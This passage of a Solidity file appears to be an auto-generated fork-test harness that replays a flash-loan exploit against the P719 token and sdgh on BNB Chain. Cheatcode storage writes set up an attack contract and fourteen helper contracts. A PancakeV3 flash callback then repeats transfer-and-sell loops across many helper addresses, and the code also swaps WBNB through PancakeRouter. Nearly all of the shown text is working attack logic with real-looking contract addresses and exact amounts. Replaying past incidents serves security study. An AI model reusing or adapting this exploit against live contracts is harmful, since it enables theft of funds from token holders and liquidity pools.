        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        {
            uint256 p719TransferFromAmount_84 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_84;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_6D0BC6_E4B9, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_84 = 526636214289627321527;
            IContract_6D0BC6_E4B9(Addresses.A_6D0BC6_E4B9).sell(sellLiveAmount_84);
        }
        {
            uint256 p719TransferFromAmount_85 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_85;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_A11189_6963, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_85 = 526636214289627321527;
            IContract_A11189_6963(Addresses.A_A11189_6963).sell(sellLiveAmount_85);
        }
        {
            uint256 p719TransferFromAmount_86 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_86;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_99839D_D644, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_86 = 526636214289627321527;
            IContract_99839D_D644(Addresses.A_99839D_D644).sell(sellLiveAmount_86);
        }
        {
            uint256 p719TransferFromAmount_87 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_87;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_5837CA_3C5E, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_87 = 526636214289627321527;
            IContract_5837CA_3C5E(Addresses.A_5837CA_3C5E).sell(sellLiveAmount_87);
        }
        {
            uint256 p719TransferFromAmount_88 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_88;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_99F8C4_7E9C, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_88 = 526636214289627321527;
            IContract_99F8C4_7E9C(Addresses.A_99F8C4_7E9C).sell(sellLiveAmount_88);
        }
        {
            uint256 p719TransferFromAmount_89 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_89;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_9102A6_6CBF, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_89 = 526636214289627321527;
            IContract_9102A6_6CBF(Addresses.A_9102A6_6CBF).sell(sellLiveAmount_89);
        }
        {
            uint256 p719TransferFromAmount_90 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_90;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_D809BE_8F35, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_90 = 526636214289627321527;
            IContract_D809BE_8F35(Addresses.A_D809BE_8F35).sell(sellLiveAmount_90);
        }
        {
            uint256 p719TransferFromAmount_91 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_91;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_DBA3B6_9131, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_91 = 526636214289627321527;
            IContract_DBA3B6_9131(Addresses.A_DBA3B6_9131).sell(sellLiveAmount_91);
        }
        {
            uint256 p719TransferFromAmount_92 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_92;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_0A9EF5_B613, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_92 = 526636214289627321527;
            IContract_0A9EF5_B613(Addresses.A_0A9EF5_B613).sell(sellLiveAmount_92);
        }
        {
            uint256 p719TransferFromAmount_93 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_93;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_DD69A8_2D5A, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_93 = 526636214289627321527;
            IContract_DD69A8_2D5A(Addresses.A_DD69A8_2D5A).sell(sellLiveAmount_93);
        }
    }

    function flashCallback21() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        {
            uint256 p719TransferFromAmount_94 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_94;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_ADBE38_98FA, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_94 = 526636214289627321527;
            IContract_ADBE38_98FA(Addresses.A_ADBE38_98FA).sell(sellLiveAmount_94);
        }
        {
            uint256 p719TransferFromAmount_95 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_95;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_E0186C_CD40, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_95 = 526636214289627321527;
            IContract_E0186C_CD40(Addresses.A_E0186C_CD40).sell(sellLiveAmount_95);
        }
        {
            uint256 p719TransferFromAmount_96 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_96;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_EC7C8E_26B0, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_96 = 526636214289627321527;
            IContract_EC7C8E_26B0(Addresses.A_EC7C8E_26B0).sell(sellLiveAmount_96);
        }
        {
            uint256 p719TransferFromAmount_97 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_97;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_339D8D_1796, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_97 = 526636214289627321527;
            IContract_339D8D_1796(Addresses.A_339D8D_1796).sell(sellLiveAmount_97);
        }
        {
            uint256 p719TransferFromAmount_98 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_98;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_D932DA_0969, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_98 = 526636214289627321527;
            IContract_D932DA_0969(Addresses.A_D932DA_0969).sell(sellLiveAmount_98);
        }
        {
            uint256 p719TransferFromAmount_99 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_99;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_5D6400_3E0C, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_99 = 526636214289627321527;
            IContract_5D6400_3E0C(Addresses.A_5D6400_3E0C).sell(sellLiveAmount_99);
        }
        {
            uint256 p719TransferFromAmount_100 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_100;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_C63E07_53F1, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_100 = 526636214289627321527;
            IContract_C63E07_53F1(Addresses.A_C63E07_53F1).sell(sellLiveAmount_100);
        }
        IERC20Like(Addresses.P719).totalSupply();
        {
            uint256 depositAmount = address(this).balance;
            if (depositAmount > 4547799074208829188341) depositAmount = 4547799074208829188341;
            if (depositAmount != 0) IWBNB(Addresses.WBNB).deposit{value: depositAmount}();
        }
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
        IERC20Like(Addresses.sdgh).balanceOf(address(this));
        {
            uint256 wbnbApproveAllowance = type(uint256).max;
            IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, wbnbApproveAllowance);
        }
    }

    function flashCallback22() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        IERC20Like(Addresses.sdgh).approve(Addresses.PancakeRouter, type(uint256).max);
        {
            if (547399074208829188341 != 0) {
                IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, 547399074208829188341);
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        547399074208829188341,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.sdgh),
                        address(this),
                        1728650325
                    );
            }
        }
        IERC20Like(Addresses.sdgh).balanceOf(address(this));
        {
            uint256 transferLiveAmount = 4000400000000000000000;
            IERC20Like(Addresses.WBNB).transfer(Addresses.PancakeV3Pool, transferLiveAmount);
        }
    }

    function _attack2() internal {
        _markCallback(2);
    }

    receive() external payable {}

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        amount0;
        amount1;
        data;
        flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x510a82a9) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindHelper(address attackHelper) external {
        helper = AttackerHelper(payable(attackHelper));
    }

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

contract AttackerHelper {
    receive() external payable {}

    function buy() external payable {
        if (address(this) == 0x1bea54B0c39140D5Ae4414150B2FFF0bd64fD6b8) {
            _helperCb2();
            return;
        }
        if (address(this) == 0xde499a0825408D2562567fF9Ef47bF90c7d12950) {
            _helperCb12();
            return;
        }
        if (address(this) == 0xfEeb1806f7CD9d527A8c3D5F90E93EE2438cF720) {
            _helperCb14();
            return;
        }
        if (address(this) == 0x6272aB4E4c7022b1532B612ee9f349E718364975) {
            _helperCb4();
            return;
        }
        if (address(this) == 0xA0F5E0d1ed5f0E36c122328e6CA455f015d9a0Df) {
            _helperCb9();
            return;
        }
        if (address(this) == 0x0a6139bB1454C223eFC8524D626936D5FAfB9D05) {
            _helperCb();
            return;
        }
        if (address(this) == 0x9927Aed3442B43A9175F51d5123f40ABF89db4F0) {
            _helperCb7();
            return;
        }
        if (address(this) == 0xC11Dbcf77C25309abEFCCF8B8282daF08EAcfC29) {
            _helperCb11();
            return;
        }
        if (address(this) == 0x75c0850e851bD8617011f67B634b46251a3FeDd5) {
            _helperCb5();
            return;
        }
        if (address(this) == 0xb91f4657fcDfd121171bb54B0FdC7669ad74c858) {
            _helperCb10();
            return;
        }
        if (address(this) == 0x995Af97E1d41E8edC467bB86CC8cA5BcCe453Ba2) {
            _helperCb8();
            return;
        }
        if (address(this) == 0xed4f43968c140F6F63135a85b9c57c79654B970f) {
            _helperCb13();
            return;
        }
        if (address(this) == 0x2EBe791c1507b1626054A8DC3857ea5Bd721816B) {
            _helperCb3();
            return;
        }
        if (address(this) == 0x8110b180f8Ca42491a0B51CDbCf06aAfFa10d6f6) {
            _helperCb6();
            return;
        }
        _helperCb2();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function helperCb2() external payable {
        _helperCb2();
        return;
    }

    function helperCb12() external payable {
        _helperCb12();
        return;
    }

    function helperCb14() external payable {
        _helperCb14();
        return;
    }

    function helperCb4() external payable {
        _helperCb4();
        return;
    }

    function helperCb9() external payable {
        _helperCb9();
        return;
    }

    function helperCb() external payable {
        _helperCb();
        return;
    }

    function helperCb7() external payable {
        _helperCb7();
        return;
    }

    function helperCb11() external payable {
        _helperCb11();
        return;
    }

    function helperCb5() external payable {
        _helperCb5();
        return;
    }

    function helperCb10() external payable {
        _helperCb10();
        return;
    }

    function helperCb8() external payable {
        _helperCb8();
        return;
    }

    function helperCb13() external payable {
        _helperCb13();
        return;
    }

    function helperCb3() external payable {
        _helperCb3();
        return;
    }

    function helperCb6() external payable {
        _helperCb6();
        return;
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _helperCb() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb2() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper2() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_D6B8,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_D6B8,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb3() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper3() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_816B,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_816B,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helper4() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_422F,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_422F,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb4() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper5() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_4975,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_4975,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb5() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper6() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_EDD5,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_EDD5,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb6() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper7() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_D6F6,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_D6F6,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb7() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper8() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_B4F0,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_B4F0,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb8() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper9() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_3BA2,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_3BA2,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb9() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper10() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_A0DF,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_A0DF,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb10() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper11() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_C858,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_C858,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb11() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper12() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_FC29,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_FC29,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb12() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper13() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_2950,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_2950,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb13() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper14() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_970F,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_970F,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }

    function _helperCb14() internal {
        {
            (bool ok,) = payable(Addresses.P719).call{value: 10000000000000000000}("");
            if (!ok)
            {  }
        }
    }

    function _helper15() public {
        Harness.vmExt()
            .store(
                Addresses.attack_helper_F720,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper_F720,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        IERC20Like(Addresses.P719).approve(Addresses.attack_contract, type(uint256).max);
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct ReplayCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_6F67 = 0x000000000000000000636F6e736F6c652e6c6f67;
